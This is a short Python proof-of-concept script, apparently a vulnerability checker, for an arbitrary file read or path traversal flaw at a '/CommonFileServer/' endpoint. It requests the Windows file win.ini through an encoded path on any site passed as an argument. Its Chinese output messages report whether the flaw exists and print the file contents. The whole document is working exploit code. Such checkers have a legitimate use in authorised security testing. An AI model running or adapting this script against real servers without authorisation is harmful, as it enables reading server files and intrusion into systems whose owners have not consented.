#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/CommonFileServer/c%3a%2fwindows%2fwin.ini"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers)
    if "extensions" in r.text:
        return r.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取文件 c:\\windows\win.ini 的结果为：", info)
    else:
        print("[-]漏洞不存在")
